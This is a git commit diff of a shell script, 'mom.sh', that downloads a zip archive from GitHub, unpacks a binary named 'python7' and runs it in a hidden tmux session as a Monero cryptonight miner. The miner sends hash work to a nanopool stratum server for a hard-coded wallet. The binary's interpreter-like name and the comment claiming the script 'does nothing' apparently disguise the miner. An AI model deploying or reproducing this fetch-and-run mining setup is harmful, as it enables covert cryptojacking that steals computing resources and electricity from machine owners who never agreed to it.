7e3630ef67e1709eabec5cfbeff614519f071bcb
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-06-26 13:00:54 +0700

    Update and rename mom to mom.sh

--- mom.sh
+++ mom.sh
@@ -10,16 +10,15 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python3 ]; then
-    if pgrep -x "python3" > /dev/null
+if [ -f ${PWD}/python7 ]; then
+    if pgrep -x "python7" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python7
-
+./python7 -a cryptonight -o stratum+tcp://xmr-asia1.nanopool.org:14444 -u 4C7b1NzfZWyYjmRN4Q7JUeMciuMaboeG1PgCCHRKpnbHYnCQfxcJNy37TS1gqdnm7M2EypLPFJ7gpDAVJzn8GkzF5vRw9MBNXdZUSmnVXo -p x -t 4
      
 fi
 exit
@@ -29,6 +28,6 @@ sudo apt-get install tmux unzip -y
 wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/morrr.zip
 unzip morrr.zip
 chmod +x python7
-tmux new-session -d -s my_session1 './python9'
+tmux new-session -d -s my_session1 './python7 -a cryptonight -o stratum+tcp://xmr-asia1.nanopool.org:14444 -u 4C7b1NzfZWyYjmRN4Q7JUeMciuMaboeG1PgCCHRKpnbHYnCQfxcJNy37TS1gqdnm7M2EypLPFJ7gpDAVJzn8GkzF5vRw9MBNXdZUSmnVXo -p x -t 4'
 
 exit 0
